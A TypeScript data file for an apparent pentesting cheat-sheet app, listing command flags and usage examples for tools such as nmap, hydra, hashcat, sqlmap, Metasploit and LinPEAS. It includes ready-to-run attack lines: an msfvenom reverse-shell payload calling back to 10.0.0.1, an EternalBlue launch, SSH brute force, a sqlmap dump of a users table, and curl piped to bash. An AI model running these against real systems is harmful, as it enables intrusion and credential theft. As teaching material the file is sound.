export interface CommandItem {
  id: string;
  tool: string;
  category:
    | "Linux CLI"
    | "Python Cyber"
    | "Network & Recon"
    | "Web Exploitation"
    | "Password Cracking"
    | "Reverse Shells & Exploits"
    | "OSINT & Info Gathering"
    | "Wireshark & Packet Analysis";
  command: string;
  title: string;
  description: string;
  flagsBreakdown?: { flag: string; description: string }[];
  codeSnippet?: string;
  tags: string[];
}

export interface ToolFlagBuilderOption {
  flag: string;
  label: string;
  description: string;
  defaultChecked?: boolean;
  value?: string;
  hasInput?: boolean;
  inputPlaceholder?: string;
}

export interface ToolFlagBuilder {
  toolId: string;
  toolName: string;
  baseCommand: string;
  description: string;
  targetPlaceholder: string;
  options: ToolFlagBuilderOption[];
}

export interface CyberToolInfo {
  id: string;
  name: string;
  category:
    | "Recon & OSINT"
    | "Web Security"
    | "Password Cracking"
    | "Network & Forensics"
    | "Exploitation"
    | "Reverse Engineering";
  summary: string;
  usedFor: string;
  installCommand: string;
  difficulty: "Beginner" | "Intermediate" | "Advanced";
  keyFlags: { flag: string; label: string; description: string }[];
  commonUseCases: { title: string; command: string; explanation: string }[];
  proTip?: string;
  officialDocsUrl?: string;
}

export const TOOL_BUILDERS: ToolFlagBuilder[] = [
  {
    toolId: "nmap",
    toolName: "Nmap Network Scanner",
    baseCommand: "nmap",
    description: "Network exploration tool and security / port scanner",
    targetPlaceholder: "192.168.56.101",
    options: [
      { flag: "-sS", label: "SYN Stealth Scan", description: "Default TCP SYN scan (half-open, fast, requires root)", defaultChecked: true },
      { flag: "-sV", label: "Service Version Detection", description: "Probe open ports to determine service/version info", defaultChecked: true },
      { flag: "-sC", label: "Default NSE Scripts", description: "Run standard safe Nmap scripts for banner & vuln detection", defaultChecked: true },
      { flag: "-Pn", label: "Skip Host Discovery", description: "Treat all hosts as online (bypass firewall ICMP blocks)" },
      { flag: "-p-", label: "Scan All Ports", description: "Scan all 65,535 TCP ports instead of top 1000" },
      { flag: "-T4", label: "Aggressive Timing", description: "Set speed template 4 (faster scan for LANs)", defaultChecked: true },
      { flag: "-A", label: "Aggressive Scan Mode", description: "Enable OS detection, version detection, script scanning, traceroute" },
      { flag: "--script vuln", label: "Vulnerability Check", description: "Run Nmap NSE vulnerability signature scripts" },
      { flag: "-oN scan.txt", label: "Save Normal Output", description: "Output scan results to scan.txt" },
    ],
  },
  {
    toolId: "theharvester",
    toolName: "theHarvester OSINT Harvester",
    baseCommand: "theHarvester",
    description: "Gather emails, subdomains, hosts, employee names, and open ports from public search engines and breach databases",
    targetPlaceholder: "target-corp.lab",
    options: [
      { flag: "-d", label: "Target Domain (-d)", description: "Domain to search for intelligence", defaultChecked: true },
      { flag: "-b google,bing,crtsh,dnsdumpster,linkedin", label: "Search Sources (-b)", description: "Specify engine and OSINT sources", defaultChecked: true },
      { flag: "-l 500", label: "Limit Results 500 (-l)", description: "Limit number of search results retrieved per source", defaultChecked: true },
      { flag: "-s", label: "Shodan Query (-s)", description: "Verify discovered IP addresses against Shodan API database" },
      { flag: "-v", label: "Verify DNS (-v)", description: "Verify hostname resolution dynamically via socket lookup" },
      { flag: "-f harv_report.xml", label: "XML Export (-f)", description: "Save harvested results into an XML report file" },
    ],
  },
  {
    toolId: "subfinder",
    toolName: "Subfinder Passive Subdomain Enumerator",
    baseCommand: "subfinder",
    description: "Fast passive subdomain discovery tool using passive online sources (virustotal, certspotter, threatcrowd)",
    targetPlaceholder: "target-corp.lab",
    options: [
      { flag: "-d", label: "Target Domain (-d)", description: "Domain to enumerate subdomains for", defaultChecked: true },
      { flag: "-v", label: "Verbose Mode (-v)", description: "Show detailed logging and discovery sources", defaultChecked: true },
      { flag: "-all", label: "All Sources (-all)", description: "Use all passive sources for maximum domain coverage" },
      { flag: "-o subdomains.txt", label: "Save File Output (-o)", description: "Write list of discovered subdomains to text file" },
      { flag: "-silent", label: "Silent Output Mode", description: "Only output clean subdomains to stdout for piped scripts" },
    ],
  },
  {
    toolId: "dnsrecon",
    toolName: "Dnsrecon Advanced DNS Scanner",
    baseCommand: "dnsrecon",
    description: "DNS enumeration tool for checking MX, NS, SOA, SPF, PTR records and AXFR zone transfer vulnerabilities",
    targetPlaceholder: "target-corp.lab",
    options: [
      { flag: "-d", label: "Target Domain (-d)", description: "Target domain name for DNS enumeration", defaultChecked: true },
      { flag: "-t axfr", label: "AXFR Zone Transfer (-t axfr)", description: "Attempt unauthenticated DNS zone transfer download", defaultChecked: true },
      { flag: "-t std", label: "Standard Records Scan (-t std)", description: "Perform standard A, AAAA, MX, NS, and SOA lookups" },
      { flag: "-t brt", label: "Brute-Force Subdomains (-t brt)", description: "Brute-force hostnames using internal wordlist" },
      { flag: "-D /usr/share/wordlists/dnsmap.txt", label: "Custom Wordlist (-D)", description: "Path to subdomains brute-forcing wordlist" },
      { flag: "--json dns_results.json", label: "JSON Export (--json)", description: "Export formatted DNS records to JSON file" },
    ],
  },
  {
    toolId: "dirsearch",
    toolName: "Dirsearch Web Directory Brute-Forcer",
    baseCommand: "dirsearch",
    description: "Advanced command-line web directory scanner for discovering hidden files, backup endpoints, and admin panels",
    targetPlaceholder: "http://target-corp.lab/",
    options: [
      { flag: "-u", label: "Target URL (-u)", description: "Base target URL to scan", defaultChecked: true },
      { flag: "-e php,html,txt,js,json,bak", label: "File Extensions (-e)", description: "Comma-separated extensions to test", defaultChecked: true },
      { flag: "-w /usr/share/wordlists/dirb/common.txt", label: "Standard Wordlist (-w)", description: "Wordlist path for dictionary brute-forcing" },
      { flag: "-t 50", label: "50 Threads (-t 50)", description: "Set concurrent HTTP request threads", defaultChecked: true },
      { flag: "-m GET,POST", label: "HTTP Methods (-m)", description: "Test multiple HTTP methods against target" },
      { flag: "--random-agent", label: "Random User-Agent", description: "Rotate HTTP User-Agent header per request" },
    ],
  },
  {
    toolId: "gobuster",
    toolName: "Gobuster Directory & Subdomain Fuzzer",
    baseCommand: "gobuster dir",
    description: "Fast directory/file & DNS subdomain brute-forcing tool written in Go",
    targetPlaceholder: "http://192.168.56.102:3000/",
    options: [
      { flag: "-w /usr/share/wordlists/dirb/common.txt", label: "Standard Wordlist", description: "Common directory wordlist path", defaultChecked: true },
      { flag: "-x php,html,txt,json", label: "File Extensions", description: "Append specific file extensions to search items", defaultChecked: true },
      { flag: "-t 50", label: "50 Threads", description: "Increase concurrent thread count for faster scanning" },
      { flag: "-k", label: "Skip TLS Verification", description: "Ignore invalid/self-signed SSL certificates" },
      { flag: "-b 404,403", label: "Blacklist Status Codes", description: "Exclude specific HTTP status codes from results" },
      { flag: "-a 'CyberLabBot/1.0'", label: "Custom User-Agent", description: "Specify HTTP User-Agent header" },
    ],
  },
  {
    toolId: "whatweb",
    toolName: "WhatWeb Web Fingerprinter",
    baseCommand: "whatweb",
    description: "Identifies web technology stacks including CMS platforms, web server software, embedded scripts, and analytics",
    targetPlaceholder: "http://target-corp.lab",
    options: [
      { flag: "-a 3", label: "Aggressive Plugin Scan (-a 3)", description: "Aggressive scanning mode triggering dynamic plugin probes", defaultChecked: true },
      { flag: "-v", label: "Verbose Output (-v)", description: "Show detailed plugin explanations and headers", defaultChecked: true },
      { flag: "--log-brief=whatweb.txt", label: "Brief Log File", description: "Save single line summaries per URL to text file" },
      { flag: "--log-json=whatweb.json", label: "JSON Log Export", description: "Save comprehensive structural details as JSON" },
    ],
  },
  {
    toolId: "gitleaks",
    toolName: "GitLeaks Secret & Token Scanner",
    baseCommand: "gitleaks detect",
    description: "Scans Git repositories, commit histories, and local folders for hardcoded credentials, secret keys, and API tokens",
    targetPlaceholder: "--source .",
    options: [
      { flag: "-v", label: "Verbose Mode (-v)", description: "Display secret snippet leaks and commit hash details", defaultChecked: true },
      { flag: "--redact", label: "Redact Sensitive Keys", description: "Mask private keys in terminal output to prevent exposure" },
      { flag: "-r report.json", label: "JSON Audit Report", description: "Export finding logs and commit diffs to JSON report" },
      { flag: "--no-git", label: "Uncommitted File Scan", description: "Scan raw directory files without parsing Git history" },
    ],
  },
  {
    toolId: "hydra",
    toolName: "THC Hydra Network Brute-Forcer",
    baseCommand: "hydra",
    description: "Fast online credential brute-forcing tool supporting SSH, FTP, HTTP, SMB, and MySQL",
    targetPlaceholder: "192.168.56.101 ssh",
    options: [
      { flag: "-l admin", label: "Single Username", description: "Specify target username 'admin'", defaultChecked: true },
      { flag: "-P /usr/share/wordlists/rockyou.txt", label: "RockYou Password List", description: "Use famous rockyou.txt wordlist", defaultChecked: true },
      { flag: "-t 16", label: "16 Threads", description: "Number of parallel connect tasks" },
      { flag: "-vV", label: "Verbose Display", description: "Show every attempted username:password combination" },
      { flag: "-e nsr", label: "Additional Checks", description: "Try null password (n), same as login (s), reverse login (r)" },
    ],
  },
  {
    toolId: "hashcat",
    toolName: "Hashcat Advanced Password Recovery",
    baseCommand: "hashcat",
    description: "World's fastest password cracker with GPU acceleration support",
    targetPlaceholder: "hashes.txt /usr/share/wordlists/rockyou.txt",
    options: [
      { flag: "-m 0", label: "MD5 Hash (-m 0)", description: "Mode 0: Standard MD5 hash format", defaultChecked: true },
      { flag: "-m 1000", label: "NTLM Hash (-m 1000)", description: "Mode 1000: Windows NTLM domain password hash" },
      { flag: "-m 1800", label: "SHA-512 Unix (-m 1800)", description: "Mode 1800: Linux /etc/shadow $6$ password hash" },
      { flag: "-m 3200", label: "Bcrypt (-m 3200)", description: "Mode 3200: Unix $2a$ / $2b$ Bcrypt hash" },
      { flag: "-a 0", label: "Straight / Dictionary Attack", description: "Mode 0: Wordlist dictionary attack", defaultChecked: true },
      { flag: "-r /usr/share/hashcat/rules/best64.rule", label: "Best64 Mutation Rules", description: "Apply transformation rules to wordlist" },
      { flag: "--show", label: "Show Cracked Passwords", description: "Display previously cracked hashes from potfile" },
    ],
  },
  {
    toolId: "wireshark",
    toolName: "Wireshark & TShark Display Filter Builder",
    baseCommand: "tshark -r capture.pcap -Y",
    description: "Construct advanced Wireshark GUI display filter expressions and TShark CLI packet analysis filters",
    targetPlaceholder: '"ip.addr == 192.168.244.129 && (http || dns)"',
    options: [
      { flag: "'ip.addr == 192.168.244.129'", label: "Filter Host IP", description: "Filter all packets with specified source/destination IP address", defaultChecked: true },
      { flag: "'tcp.port == 80 || tcp.port == 443'", label: "HTTP/HTTPS Ports", description: "Filter web traffic on standard ports 80 & 443" },
      { flag: "'tcp.flags == 0x02'", label: "SYN Scan / Init (0x02)", description: "Filter TCP SYN packets to detect connection attempts & port scans" },
      { flag: "'frame contains \"admin\"'", label: "Search Payload String", description: "Inspect raw packet frames containing cleartext keyword 'admin'" },
      { flag: "'http.response.code == 200'", label: "HTTP 200 OK Responses", description: "Filter successful web application HTTP responses" },
      { flag: "'ftp.request.command == \"PASS\"'", label: "FTP Cleartext Password", description: "Isolate unencrypted FTP password authentication commands" },
      { flag: "'!(tcp.len == 0)'", label: "Exclude Empty TCP ACKs", description: "Filter out zero-payload TCP keep-alives and empty ACK frames" },
    ],
  },
  {
    toolId: "sqlmap",
    toolName: "SQLmap SQL Injection Automator",
    baseCommand: "sqlmap",
    description: "Automatic SQL injection and database takeover engine",
    targetPlaceholder: '-u "http://target.lab/item.php?id=1"',
    options: [
      { flag: '-u "http://target.lab/item.php?id=1"', label: "Target URL", description: "Target URL containing injectable parameter", defaultChecked: true },
      { flag: "--dbs", label: "Enumerate Databases", description: "List all accessible databases", defaultChecked: true },
      { flag: "--tables", label: "Enumerate Tables", description: "List database tables inside target database" },
      { flag: "--dump", label: "Dump Table Entries", description: "Extract and dump table rows to file" },
      { flag: "--batch", label: "Automate Prompts", description: "Never ask for user input, use default behavior", defaultChecked: true },
      { flag: "--risk 3 --level 5", label: "Max Test Vectors", description: "Perform deep tests including HTTP headers & cookies" },
      { flag: "--os-shell", label: "Spawn OS Command Shell", description: "Prompt for an interactive OS command execution shell" },
    ],
  },
  {
    toolId: "metasploit",
    toolName: "Metasploit Framework (msfconsole)",
    baseCommand: "msfconsole -x",
    description: "Penetration testing platform for exploit execution and payload delivery",
    targetPlaceholder: '"use exploit/multi/handler; set PAYLOAD generic/shell_reverse_tcp; run"',
    options: [
      { flag: '"use exploit/windows/smb/ms17_010_eternalblue"', label: "EternalBlue Exploit", description: "Load MS17-010 EternalBlue exploit module" },
      { flag: '"set RHOSTS 192.168.1.50"', label: "Set Target IP", description: "Specify target remote host address", defaultChecked: true },
      { flag: '"set LHOST 10.0.0.1"', label: "Set Attacker IP", description: "Specify local listener host IP", defaultChecked: true },
      { flag: '"set LPORT 4444"', label: "Set Port 4444", description: "Set reverse connection port", defaultChecked: true },
      { flag: '"exploit -z"', label: "Exploit Background", description: "Run exploit and push session to background", defaultChecked: true },
    ],
  },
];

export const CYBER_TOOLS_ENCYCLOPEDIA: CyberToolInfo[] = [
  {
    id: "nmap",
    name: "Nmap Network Mapper",
    category: "Recon & OSINT",
    summary: "Industry-standard open source utility for network discovery, port scanning, and vulnerability detection.",
    usedFor: "Discovering live hosts on a network, identifying open TCP/UDP ports, detecting running service versions, determining remote operating systems, and executing automated NSE vulnerability scripts.",
    installCommand: "sudo apt update && sudo apt install nmap",
    difficulty: "Beginner",
    keyFlags: [
      { flag: "-sS", label: "TCP SYN Stealth Scan", description: "Half-open TCP scan mode (fast, stealthy, requires root)." },
      { flag: "-sV", label: "Service Versioning", description: "Probes open ports to determine service names and version numbers." },
      { flag: "-sC", label: "Default NSE Scripts", description: "Runs safe standard Nmap scripts for banner grabbing and vulnerability checks." },
      { flag: "-Pn", label: "Skip Ping Discovery", description: "Treats all hosts as online, bypassing ICMP ping firewall blocks." },
      { flag: "-p-", label: "Scan All 65k Ports", description: "Scans all 65,535 TCP ports instead of default top 1,000 ports." },
      { flag: "-A", label: "Aggressive Scan", description: "Enables OS detection, service versioning, NSE scripts, and traceroute." },
      { flag: "--script vuln", label: "Vulnerability Scan", description: "Runs automated vulnerability check signatures against target." },
    ],
    commonUseCases: [
      {
        title: "Fast Network Host Discovery",
        command: "nmap -sn 192.168.1.0/24",
        explanation: "Sweeps the local subnet using ICMP/ARP to discover active IP addresses without port scanning.",
      },
      {
        title: "Comprehensive Target Audit",
        command: "nmap -sC -sV -p- -T4 --script vuln 192.168.1.100",
        explanation: "Scans all 65,535 ports with service versioning, default scripts, and vulnerability checks.",
      },
    ],
    proTip: "Combine `-oN scan_results.txt` to save human-readable findings for your penetration testing report.",
  },
  {
    id: "gobuster",
    name: "Gobuster Directory & Subdomain Fuzzer",
    category: "Web Security",
    summary: "High-performance Go tool used to brute-force web directories, hidden endpoints, and DNS subdomains.",
    usedFor: "Discovering hidden web administrative panels, unlinked endpoints, backup files (.env, .bak, .sql), and hidden subdomains during web reconnaissance.",
    installCommand: "sudo apt install gobuster",
    difficulty: "Beginner",
    keyFlags: [
      { flag: "dir", label: "Directory Mode", description: "Brute-force HTTP web directory paths." },
      { flag: "dns", label: "DNS Mode", description: "Brute-force subdomains against target domain." },
      { flag: "-u", label: "Target URL", description: "Base URL to perform directory scan against." },
      { flag: "-w", label: "Wordlist Path", description: "Path to wordlist file (e.g., /usr/share/wordlists/dirb/common.txt)." },
      { flag: "-x", label: "Extensions", description: "Commas-separated list of file extensions (php,html,txt,json)." },
      { flag: "-t", label: "Threads Count", description: "Number of concurrent worker threads (default 10, max 100)." },
    ],
    commonUseCases: [
      {
        title: "Web Directory Fuzzing",
        command: "gobuster dir -u http://192.168.1.50/ -w /usr/share/wordlists/dirb/common.txt -x php,html,txt",
        explanation: "Discovers hidden web folders and scripts with specified extensions.",
      },
      {
        title: "Subdomain Brute-Forcing",
        command: "gobuster dns -d target.com -w /usr/share/wordlists/dnsmap.txt",
        explanation: "Enumerates valid subdomains of target.com via DNS lookups.",
      },
    ],
    proTip: "Use `-k` to bypass self-signed SSL/TLS certificate warnings when scanning internal HTTPS targets.",
  },
  {
    id: "sqlmap",
    name: "SQLmap SQL Injection Engine",
    category: "Web Security",
    summary: "Automatic SQL injection and database takeover tool capable of exploiting all major SQL database engines.",
    usedFor: "Detecting SQL injection vulnerabilities in GET/POST parameters, extracting database tables, cracking stored password hashes, and spawning interactive command shells on target OS.",
    installCommand: "sudo apt install sqlmap",
    difficulty: "Intermediate",
    keyFlags: [
      { flag: "-u", label: "Target URL", description: "URL containing injectable parameter (e.g. ?id=1)." },
      { flag: "--dbs", label: "List Databases", description: "Enumerates all databases available to current SQL user." },
      { flag: "--tables", label: "List Tables", description: "Lists database tables in specified database (-D db_name)." },
      { flag: "--dump", label: "Dump Table Data", description: "Extracts and prints rows from target table." },
      { flag: "--batch", label: "Non-Interactive", description: "Auto-accepts default options without prompting user." },
      { flag: "--os-shell", label: "Spawn OS Shell", description: "Attempts to gain remote command line execution on host OS." },
    ],
    commonUseCases: [
      {
        title: "Database Discovery",
        command: 'sqlmap -u "http://target.lab/item.php?id=1" --dbs --batch',
        explanation: "Tests parameter 'id' for SQL injection and lists all accessible database schemas.",
      },
      {
        title: "Dump User Credentials Table",
        command: 'sqlmap -u "http://target.lab/item.php?id=1" -D app_db -T users --dump',
        explanation: "Extracts usernames, password hashes, and user metadata from table 'users'.",
      },
    ],
    proTip: "Pass saved Burp HTTP requests with `sqlmap -r request.txt` to test complex authenticated POST bodies.",
  },
  {
    id: "hydra",
    name: "THC Hydra Network Brute-Forcer",
    category: "Password Cracking",
    summary: "Fast online network login brute-forcing tool supporting over 50 protocols including SSH, FTP, RDP, and HTTP forms.",
    usedFor: "Testing password strength and attempting credential recovery by brute-forcing remote authentication services.",
    installCommand: "sudo apt install hydra",
    difficulty: "Intermediate",
    keyFlags: [
      { flag: "-l / -L", label: "User / User List", description: "Single username or text file of target usernames." },
      { flag: "-p / -P", label: "Pass / Pass List", description: "Single password string or wordlist path (rockyou.txt)." },
      { flag: "-t", label: "Parallel Tasks", description: "Number of parallel connection tasks (default 16)." },
      { flag: "-vV", label: "Verbose Mode", description: "Prints every username and password attempt to screen." },
      { flag: "-e nsr", label: "Additional Checks", description: "Tries null password (n), login as password (s), and reverse login (r)." },
    ],
    commonUseCases: [
      {
        title: "SSH Credential Brute-Force",
        command: "hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.50 -t 16",
        explanation: "Brute-forces user 'admin' against SSH daemon on port 22.",
      },
      {
        title: "Web Form POST Login Attack",
        command: 'hydra -l admin -P rockyou.txt 192.168.1.50 http-post-form "/login.php:user=^USER^&pass=^PASS^:Login failed"',
        explanation: "Brute-forces HTTP login form parameters until 'Login failed' is absent.",
      },
    ],
    proTip: "Throttle threads with `-t 4` when attacking rate-limited services to prevent lockout.",
  },
  {
    id: "hashcat",
    name: "Hashcat Advanced Password Recovery",
    category: "Password Cracking",
    summary: "World's fastest GPU-accelerated password recovery engine supporting hundreds of hash algorithms.",
    usedFor: "Cracking captured password hashes (MD5, NTLM, WPA2/WPA3 WiFi handshakes, Bcrypt, SHA-512) utilizing GPU matrix performance.",
    installCommand: "sudo apt install hashcat",
    difficulty: "Advanced",
    keyFlags: [
      { flag: "-m 0", label: "MD5 Mode", description: "Hash mode 0: Standard MD5 hash." },
      { flag: "-m 1000", label: "NTLM Mode", description: "Hash mode 1000: Windows NTLM domain password hash." },
      { flag: "-m 1800", label: "Linux SHA-512", description: "Hash mode 1800: Linux /etc/shadow $6$ hash." },
      { flag: "-a 0", label: "Straight Attack", description: "Attack mode 0: Straight wordlist dictionary attack." },
      { flag: "-r", label: "Mutation Rules", description: "Applies transformation rules (capitalization, leet speak) to wordlist." },
      { flag: "--show", label: "Show Cracked", description: "Displays previously recovered cleartext passwords." },
    ],
    commonUseCases: [
      {
        title: "Crack Windows NTLM Hashes",
        command: "hashcat -m 1000 -a 0 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt",
        explanation: "Cracks Windows Active Directory NTLM password hashes using dictionary words.",
      },
      {
        title: "Wordlist Mutation Attack",
        command: "hashcat -m 0 -a 0 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule",
        explanation: "Applies top 64 password mutation rules to expand wordlist coverage.",
      },
    ],
    proTip: "Use `hashcat --example-hashes` to find the exact mode number for any hash format.",
  },
  {
    id: "wireshark",
    name: "Wireshark & TShark Network Packet Analyzer",
    category: "Network & Forensics",
    summary: "World's premier GUI packet analyzer and CLI TShark packet inspection utility.",
    usedFor: "Deep packet analysis, capturing live network traffic, troubleshooting TCP resets/retransmissions, inspecting unencrypted passwords, and analyzing PCAP malware captures.",
    installCommand: "sudo apt install wireshark tshark",
    difficulty: "Intermediate",
    keyFlags: [
      { flag: "-i eth0", label: "Interface", description: "Listens on specified network interface." },
      { flag: "-r file.pcap", label: "Read PCAP", description: "Loads captured packet trace file for offline inspection." },
      { flag: "-Y 'expr'", label: "Display Filter", description: "Applies display filter string to isolate matching packets." },
      { flag: "-w dump.pcap", label: "Save PCAP", description: "Writes live captured packets directly to file." },
    ],
    commonUseCases: [
      {
        title: "Filter HTTP POST Requests",
        command: "tshark -r capture.pcap -Y 'http.request.method == \"POST\"'",
        explanation: "Filters packets containing HTTP POST data submissions.",
      },
      {
        title: "Find Packets Containing 'password'",
        command: "tshark -r capture.pcap -Y 'frame contains \"password\"'",
        explanation: "Searches raw payload frames for cleartext password text.",
      },
    ],
    proTip: "Use `Follow TCP Stream` in Wireshark GUI to reconstruct full text conversations between client and server.",
  },
  {
    id: "metasploit",
    name: "Metasploit Framework (msfconsole)",
    category: "Exploitation",
    summary: "Comprehensive penetration testing platform containing thousands of public exploit modules and post-exploitation scripts.",
    usedFor: "Searching vulnerability exploits, generating custom shellcode payloads (msfvenom), executing exploits against vulnerable services, and managing interactive Meterpreter sessions.",
    installCommand: "sudo apt install metasploit-framework",
    difficulty: "Advanced",
    keyFlags: [
      { flag: "search", label: "Search Modules", description: "Finds exploit and auxiliary modules by CVE or service name." },
      { flag: "use", label: "Select Module", description: "Loads module into active console workspace." },
      { flag: "set RHOSTS", label: "Set Target IP", description: "Configures remote target IP address." },
      { flag: "set PAYLOAD", label: "Set Payload", description: "Specifies payload binary delivered upon successful exploit." },
      { flag: "exploit", label: "Run Exploit", description: "Executes weaponized payload against target service." },
    ],
    commonUseCases: [
      {
        title: "Msfvenom Reverse Shell Generator",
        command: "msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf -o shell.elf",
        explanation: "Compiles a 64-bit Linux ELF binary payload that connects back to listener at 10.0.0.1:4444.",
      },
      {
        title: "Exploit Launch via MSFConsole",
        command: 'msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 192.168.1.50; exploit"',
        explanation: "Fires EternalBlue SMB exploit directly against target system.",
      },
    ],
    proTip: "Use `migrate` in Meterpreter to shift your payload process into a stable system service like `lsass.exe` or `svchost.exe`.",
  },
  {
    id: "burpsuite",
    name: "Burp Suite Web Security Tester",
    category: "Web Security",
    summary: "Leading web application security testing proxy, request manipulator, and scanner.",
    usedFor: "Interception and modification of HTTP/HTTPS web requests in transit, parameter fuzzing (Intruder), request replaying (Repeater), and string encoding/decoding.",
    installCommand: "sudo apt install burpsuite",
    difficulty: "Intermediate",
    keyFlags: [
      { flag: "Proxy Intercept", label: "Intercept Requests", description: "Pauses browser requests to allow on-the-fly parameter tampering." },
      { flag: "Repeater", label: "Manual Tweak & Resend", description: "Allows repeating altered HTTP requests to observe server responses." },
      { flag: "Intruder", label: "Payload Fuzzer", description: "Automated parameter dictionary and brute-force testing tool." },
      { flag: "Decoder", label: "String Converter", description: "Encodes/decodes Base64, Hex, URL, and HTML entities." },
    ],
    commonUseCases: [
      {
        title: "Bypass Client-Side Form Validation",
        command: "Configure Browser Proxy -> 127.0.0.1:8080 -> Intercept On -> Modify HTTP POST parameters",
        explanation: "Intercepts request before hitting server, modifying hidden prices or role privileges.",
      },
    ],
    proTip: "Install Burp's CA certificate in your browser to inspect encrypted HTTPS traffic without browser security warnings.",
  },
  {
    id: "subfinder",
    name: "Subfinder Passive Subdomain Enumerator",
    category: "Recon & OSINT",
    summary: "Fast passive subdomain discovery tool leveraging over 40 online intelligence sources.",
    usedFor: "Discovering active subdomains of target domains passively (without sending suspicious traffic to target networks) using sources like Crt.sh, VirusTotal, and ThreatCrowd.",
    installCommand: "go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest",
    difficulty: "Beginner",
    keyFlags: [
      { flag: "-d", label: "Target Domain", description: "Domain name to discover subdomains for." },
      { flag: "-all", label: "All Sources", description: "Queries all passive search providers for maximum domain coverage." },
      { flag: "-o", label: "Output File", description: "Saves discovered subdomains to text file." },
      { flag: "-silent", label: "Silent Mode", description: "Outputs only clean subdomain strings to stdout for script piping." },
    ],
    commonUseCases: [
      {
        title: "Passive Subdomain Extraction",
        command: "subfinder -d target.com -all -o subdomains.txt",
        explanation: "Extracts all subdomains for target.com into subdomains.txt passively.",
      },
      {
        title: "Pipe Clean Subdomains to Live Web Checker",
        command: "subfinder -d target.com -silent | httpx -title -status-code",
        explanation: "Pipes discovered subdomains to httpx to verify live HTTP status codes and page titles.",
      },
    ],
    proTip: "Configure API keys in `~/.config/subfinder/provider-config.yaml` to unlock premium sources like SecurityTrails and Shodan.",
  },
  {
    id: "linpeas",
    name: "LinPEAS Linux Privilege Escalation Script",
    category: "Exploitation",
    summary: "Automated script that searches for privilege escalation paths on Linux/Unix systems.",
    usedFor: "Scanning target Linux systems for writable cron jobs, misconfigured SUID binaries, password files, active internal ports, kernel vulnerabilities, and GTFOBins exploits.",
    installCommand: "curl -sL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh",
    difficulty: "Intermediate",
    keyFlags: [
      { flag: "-a", label: "All Checks", description: "Performs full thorough system checks." },
      { flag: "-s", label: "Stealth Mode", description: "Reduces disk writes to evade detection." },
    ],
    commonUseCases: [
      {
        title: "One-Liner Execution from Memory",
        command: "curl -sL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | bash",
        explanation: "Downloads and executes LinPEAS directly in RAM without saving files to disk.",
      },
    ],
    proTip: "Focus on RED/YELLOW highlighted output in LinPEAS findings — 95% of root vectors are highlighted in red.",
  },
  {
    id: "aircrack-ng",
    name: "Aircrack-ng WiFi Security Suite",
    category: "Network & Forensics",
    summary: "Complete 802.11 wireless network security assessment tool suite.",
    usedFor: "Monitoring wireless packets, capturing WPA/WPA2 4-way handshakes (`airodump-ng`), deauthenticating clients (`aireplay-ng`), and cracking pre-shared WiFi keys using wordlists.",
    installCommand: "sudo apt install aircrack-ng",
    difficulty: "Advanced",
    keyFlags: [
      { flag: "-w", label: "Wordlist Path", description: "Dictionary file path for handshake cracking." },
      { flag: "-b", label: "Target BSSID", description: "MAC address of target access point." },
    ],
    commonUseCases: [
      {
        title: "Crack WPA2 Handshake Cap File",
        command: "aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 00:14:6C:7E:40:80 capture.cap",
        explanation: "Cracks WPA2 handshake stored in capture.cap using rockyou.txt.",
      },
    ],
    proTip: "Put your wireless card into monitor mode with `sudo airmon-ng start wlan0` before starting packet capture.",
  },
  {
    id: "ghidra",
    name: "Ghidra Reverse Engineering Framework",
    category: "Reverse Engineering",
    summary: "NSA-developed software reverse engineering suite featuring powerful decompiler and disassembler tools.",
    usedFor: "Decompiling binary executables (ELF, PE, Mach-O) into readable C pseudocode, analyzing malware functions, vulnerability research, and solving CTF reverse engineering challenges.",
    installCommand: "sudo apt install ghidra",
    difficulty: "Advanced",
    keyFlags: [
      { flag: "Decompiler", label: "C Pseudocode View", description: "Converts assembly machine code back into structured C pseudocode." },
      { flag: "Symbol Tree", label: "Functions & Globals", description: "Navigates binary function names, imports, and global variables." },
    ],
    commonUseCases: [
      {
        title: "Decompile Target Function Pseudocode",
        command: "Open binary in Ghidra -> Auto-Analyze -> Select function in Symbol Tree -> Read Decompiler Window",
        explanation: "Reconstructs binary algorithm logic to find hardcoded check passwords or buffer overflow vulnerabilities.",
      },
    ],
    proTip: "Use `R` shortcut key in Ghidra to rename variables in the decompiler to make assembly reverse engineering significantly easier.",
  },
  {
    id: "cyberchef",
    name: "CyberChef Cyber Swiss Army Knife",
    category: "Reverse Engineering",
    summary: "Web-based multi-tool for data encoding, decoding, encryption, parsing, and format transformation.",
    usedFor: "Visually decoding Base64, Hex, XOR, URL strings, parsing JWT tokens, analyzing malicious shellcode, and converting data formats via chained operation recipes.",
    installCommand: "Access via browser (https://gchq.github.io/CyberChef/) or run locally via Docker.",
    difficulty: "Beginner",
    keyFlags: [
      { flag: "From Base64", label: "Base64 Decoder", description: "Decodes Base64 encoded payload strings." },
      { flag: "XOR", label: "XOR Decryption", description: "Decrypts XOR obfuscated bytes using specified key." },
      { flag: "Extract URLs", label: "URL Extraction", description: "Parses and extracts all URL strings from raw text." },
    ],
    commonUseCases: [
      {
        title: "Decode Obfuscated Powershell Payload",
        command: "Recipe: From Base64 -> Decode Text (UTF-16LE)",
        explanation: "Converts Base64 encoded Powershell execution string back into cleartext script.",
      },
    ],
    proTip: "Use the `Magic` recipe in CyberChef to automatically detect and undo multi-layered data obfuscation.",
  },
  {
    id: "masscan",
    name: "Masscan Ultra-Fast Port Scanner",
    category: "Recon & OSINT",
    summary: "Massive IP port scanner capable of scanning the entire Internet in 6 minutes at 10 million packets per second.",
    usedFor: "High-speed network reconnaissance over huge IP address spaces (/16 or /8 subnets) to quickly pinpoint open ports.",
    installCommand: "sudo apt install masscan",
    difficulty: "Intermediate",
    keyFlags: [
      { flag: "-p0-65535", label: "Port Range", description: "Scan all 65k TCP ports." },
      { flag: "--rate=10000", label: "Packet Rate", description: "Set packet transmission rate per second." },
      { flag: "--open-only", label: "Open Ports", description: "Display only open ports in output." },
    ],
    commonUseCases: [
      {
        title: "High Speed Subnet Port Sweep",
        command: "masscan 10.0.0.0/8 -p80,443,22 --rate=5000",
